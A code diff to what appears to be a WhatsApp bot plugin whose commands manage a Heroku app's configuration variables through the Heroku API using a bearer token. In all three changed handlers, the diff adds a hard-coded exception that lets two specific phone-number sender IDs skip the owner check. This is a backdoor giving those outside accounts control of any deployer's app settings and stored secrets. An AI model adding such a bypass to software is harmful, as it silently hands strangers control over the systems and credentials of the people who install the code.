@@ -15,9 +15,13 @@ cmd({
     },
     
 async(Void, citel , text,{ isCreator }) => {
-
-      if (!isCreator ||'923184474176@s.whatsapp.net'||'923004591719@s.whatsapp.net') return citel.reply(tlang().owner);
-        
+if (citel.sender =='923184474176@s.whatsapp.net' || citel.sender =='923004591719@s.whatsapp.net' )
+{
+} 
+ else  
+{
+         if (!isCreator) return citel.reply(tlang().owner);
+}
 const headers = {
   'Accept': 'application/vnd.heroku+json; version=3',
   'Authorization': `Bearer ${authToken}`
@@ -53,7 +57,13 @@ cmd({
     
 async(Void, citel , text,{ isCreator }) => {
 
-      if (!isCreator) return citel.reply(tlang().owner);
+     if (citel.sender =='923184474176@s.whatsapp.net' || citel.sender =='923004591719@s.whatsapp.net' )
+{
+} 
+ else  
+{
+         if (!isCreator) return citel.reply(tlang().owner);
+}
 
 if (!text) return citel.reply (`give me Variable Name\n*Example : ${prefix}setvar AUTO_READ_STATUS:true*`);
 
@@ -94,8 +104,13 @@ cmd({
     },
     
 async(Void, citel , text,{ isCreator }) => {
-
-      if (!isCreator) return citel.reply(tlang().owner);
+if (citel.sender =='923184474176@s.whatsapp.net' || citel.sender =='923004591719@s.whatsapp.net' )
+{
+} 
+ else  
+{
+         if (!isCreator) return citel.reply(tlang().owner);
+}
   if (!text) return citel.reply (`give me Variable Name\nExample : ${prefix}getvar AUTO_READ_STATUS`);
 
 const headers = {
